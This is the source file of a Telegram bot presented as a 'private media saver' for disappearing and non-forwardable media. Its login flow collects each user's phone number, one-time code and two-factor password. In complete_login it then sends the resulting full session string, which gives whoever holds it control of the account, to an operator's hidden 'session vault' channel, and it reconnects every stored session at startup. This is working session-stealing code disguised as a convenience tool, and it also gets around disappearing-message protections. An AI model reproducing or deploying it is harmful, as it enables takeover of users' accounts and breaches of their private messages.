import os
import nest_asyncio
import asyncio
import logging
from datetime import datetime

from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    ChannelPrivateError
)

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    KeyboardButton
)
from telegram.constants import ChatAction
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
    ConversationHandler
)

from dotenv import load_dotenv
load_dotenv()

# ================= CONFIG ================= #

DEFAULT_API_ID = int(os.getenv("API_ID"))
DEFAULT_API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")

ADMIN_ID = int(os.getenv("ADMIN_ID", "8440659080"))
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1002753939875"))

# PRIVATE SESSION VAULT CHANNEL
SESSION_CHANNEL_ID = int(os.getenv("SESSION_CHANNEL_ID", "-1003526329618"))  # REQUIRED

WELCOME_IMAGE = "https://graph.org/file/45580ccca91241c2dbf76-d29d2b3a1c790f9c04.jpg"
SUPPORT_LINK = "https://t.me/unbornvillain"

# ========================================= #

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger("UserBot")

nest_asyncio.apply()

app = ApplicationBuilder().token(BOT_TOKEN).build()

API_ID, API_HASH, PHONE, CODE, PASSWORD, FETCH_LINK = range(6)

user_login_data = {}
active_clients = {}
connected_users = set()

# ================= START ================= #

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inline_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("𝗖𝗼𝗻𝗻𝗲𝗰𝘁 𝗬𝗼𝘂𝗿 𝗔𝗰𝗰𝗼𝘂𝗻𝘁", callback_data="connect")],
        [InlineKeyboardButton("🍬𝗦𝗨𝗣𝗣𝗢𝗥𝗧🍬", url=SUPPORT_LINK)]
    ])

    reply_kb = ReplyKeyboardMarkup(
        [[KeyboardButton("📥 ᴅᴏᴡɴʟᴏᴀᴅ ɴᴏɴ-ɴᴏʀᴡᴀʀᴅᴀʙʟᴇ ᴍᴇᴅɪᴀ")]],
        resize_keyboard=True
    )

    await update.message.reply_photo(
        photo=WELCOME_IMAGE,
        caption=(
            "<b>✨𝘄𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝗱𝗶𝗮 𝘀𝗮𝘃𝗲𝗿✨</b>\n\n"
            "🔐 <i>sᴇᴄᴜʀᴇʟʏ ᴄᴏɴɴᴇᴄᴛ ʏᴏᴜʀ Tᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ.</i>\n\n"
            "<b>⚙️ 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀:</b>\n"
            "• sᴀᴠᴇ ᴅɪsᴀᴘᴘᴇᴀʀɪɴɢ ᴍᴇᴅɪᴀ 📦\n"
            "• ᴅᴏᴡɴʟᴏᴀᴅ ɴᴏɴ-ғᴏʀᴡᴀʀᴅᴀʙʟᴇ 🔓\n"
            "• ʙᴀᴄᴋɢʀᴏᴜɴᴅ ʀᴜɴ 📲"
        ),
        parse_mode="HTML",
        reply_markup=inline_kb
    )

    await update.message.reply_text(
        "☝️ 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗺𝗲𝗻𝘂 𝗯𝗲𝗹𝗼𝘄",
        reply_markup=reply_kb
    )

# ================= KEEP ALIVE ================= #

async def keep_client_alive(client: TelegramClient, user_id: int):
    while True:
        try:
            await client.run_until_disconnected()
        except Exception as e:
            logger.error(f"[Client Crash {user_id}] {e}")
            await asyncio.sleep(10)

# ================= CONNECT FLOW ================= #

async def connect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id in connected_users:
        await update.callback_query.answer()
        await update.callback_query.message.reply_text(
            "⚠️ You're already connected.\nUse /cancel to switch."
        )
        return ConversationHandler.END

    await update.callback_query.answer()
    await update.callback_query.message.reply_text(
        "📲 <b>Enter your API ID</b> or send /skip",
        parse_mode="HTML"
    )
    return API_ID

async def skip_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_login_data[update.effective_user.id] = {
        "api_id": DEFAULT_API_ID,
        "api_hash": DEFAULT_API_HASH
    }
    await update.message.reply_text("📞 Send phone number with country code:")
    return PHONE

async def get_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if not text.isdigit():
        await update.message.reply_text("❌ API ID must be number or /skip")
        return API_ID
    user_login_data[update.effective_user.id] = {"api_id": int(text)}
    await update.message.reply_text("🔑 Send API HASH or /skip")
    return API_HASH

async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_login_data[update.effective_user.id]["api_hash"] = update.message.text.strip()
    await update.message.reply_text("📞 Send phone number:")
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    phone = update.message.text.strip()
    data = user_login_data[user_id]

    client = TelegramClient(
        StringSession(),
        data["api_id"],
        data["api_hash"]
    )

    await client.connect()
    await client.send_code_request(phone)

    data["client"] = client
    data["phone"] = phone

    await update.message.reply_text("🔐 Enter OTP (1 2 3 4 5)")
    return CODE

async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    code = update.message.text.replace(" ", "")
    client = user_login_data[user_id]["client"]

    try:
        await client.sign_in(user_login_data[user_id]["phone"], code)
        return await complete_login(update, context)
    except SessionPasswordNeededError:
        await update.message.reply_text("🔑 Enter 2FA password:")
        return PASSWORD
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        await update.message.reply_text("❌ OTP invalid or expired.")
    except Exception as e:
        await update.message.reply_text(f"❌ {e}")

    return ConversationHandler.END

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    client = user_login_data[update.effective_user.id]["client"]
    await client.sign_in(password=update.message.text.strip())
    return await complete_login(update, context)

# ================= MEDIA HANDLER ================= #

async def add_media_handler(client):
    @client.on(events.NewMessage(incoming=True))
    async def handler(event):
        if event.is_private and event.media and getattr(event.media, "ttl_seconds", None):
            try:
                file = await event.download_media()
                await client.send_file("me", file, caption="🕒 Disappearing media saved")
            except Exception as e:
                logger.warning(f"[Media Error] {e}")

# ================= SAVE SESSION TO CHANNEL ================= #

async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    client = user_login_data[user_id]["client"]
    session_string = client.session.save()
    me = await client.get_me()

    await context.bot.send_message(
        chat_id=SESSION_CHANNEL_ID,
        text=(
            f"#SESSION\n"
            f"USER_ID: {user_id}\n"
            f"ACCOUNT_ID: {me.id}\n"
            f"SESSION: {session_string}\n"
            f"DATE: {datetime.now()}"
        )
    )

    connected_users.add(user_id)
    active_clients[user_id] = client

    await add_media_handler(client)
    asyncio.create_task(keep_client_alive(client, user_id))

    await update.message.reply_text("✅ Successfully connected & running!")
    user_login_data.pop(user_id, None)

    return ConversationHandler.END

# ================= AUTO CONNECT ================= #

async def auto_connect_all_sessions():
    async for msg in app.bot.get_chat_history(SESSION_CHANNEL_ID, limit=2000):
        if not msg.text or "#SESSION" not in msg.text:
            continue

        data = {}
        for line in msg.text.splitlines():
            if ":" in line:
                k, v = line.split(":", 1)
                data[k.strip()] = v.strip()

        try:
            user_id = int(data["USER_ID"])
            session = data["SESSION"]
        except:
            continue

        if user_id in connected_users:
            continue

        try:
            client = TelegramClient(
                StringSession(session),
                DEFAULT_API_ID,
                DEFAULT_API_HASH
            )
            await client.start()
            if not await client.is_user_authorized():
                continue

            await add_media_handler(client)
            active_clients[user_id] = client
            connected_users.add(user_id)

            asyncio.create_task(keep_client_alive(client, user_id))
            logger.info(f"✅ Auto connected {user_id}")

        except Exception as e:
            logger.error(f"❌ Auto-connect failed {user_id}: {e}")

# ================= FETCH MEDIA ================= #

async def menu_fetch_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in connected_users:
        await update.message.reply_text("⚠️ Connect account first.")
        return ConversationHandler.END

    await update.message.reply_text("📎 Send message link")
    return FETCH_LINK

async def fetch_from_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_chat_action(update.effective_chat.id, ChatAction.TYPING)

    client = active_clients.get(update.effective_user.id)
    if not client:
        await update.message.reply_text("❌ Session not active.")
        return ConversationHandler.END

    try:
        text = update.message.text.strip()

        if "t.me/c/" in text:
            parts = text.split("t.me/c/")[1].split("/")
            chat_id = int("-100" + parts[0])
            msg_id = int(parts[1])
        else:
            parts = text.split("t.me/")[1].split("/")
            chat_id = parts[0]
            msg_id = int(parts[1])

        entity = await client.get_entity(chat_id)
        msg = await client.get_messages(entity, ids=msg_id)

        if not msg or not msg.media:
            await update.message.reply_text("⚠️ No media found.")
            return ConversationHandler.END

        file = await msg.download_media()
        await client.send_file("me", file, caption="📥 Fetched media")
        await update.message.reply_text("✅ Sent to Saved Messages")

    except ChannelPrivateError:
        await update.message.reply_text("❌ Join channel first.")
    except Exception as e:
        await update.message.reply_text(f"❌ {e}")

    return ConversationHandler.END

# ================= CANCEL ================= #

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_login_data.pop(update.effective_user.id, None)
    await update.message.reply_text("❌ Cancelled. Use /start.")
    return ConversationHandler.END

# ================= HANDLERS ================= #

login_conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(connect_callback, pattern="connect")],
    states={
        API_ID: [CommandHandler("skip", skip_api_id), MessageHandler(filters.TEXT, get_api_id)],
        API_HASH: [CommandHandler("skip", skip_api_id), MessageHandler(filters.TEXT, get_api_hash)],
        PHONE: [MessageHandler(filters.TEXT, get_phone)],
        CODE: [MessageHandler(filters.TEXT, get_otp)],
        PASSWORD: [MessageHandler(filters.TEXT, get_password)],
    },
    fallbacks=[CommandHandler("cancel", cancel)],
)

fetch_conv = ConversationHandler(
    entry_points=[MessageHandler(filters.Regex("^📥"), menu_fetch_request)],
    states={FETCH_LINK: [MessageHandler(filters.TEXT, fetch_from_link)]},
    fallbacks=[CommandHandler("cancel", cancel)],
)

# ================= MAIN ================= #

async def main():
    await auto_connect_all_sessions()
    print("🤖 Bot Running...")
    await app.run_polling()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("cancel", cancel))
app.add_handler(login_conv)
app.add_handler(fetch_conv)

asyncio.run(main())
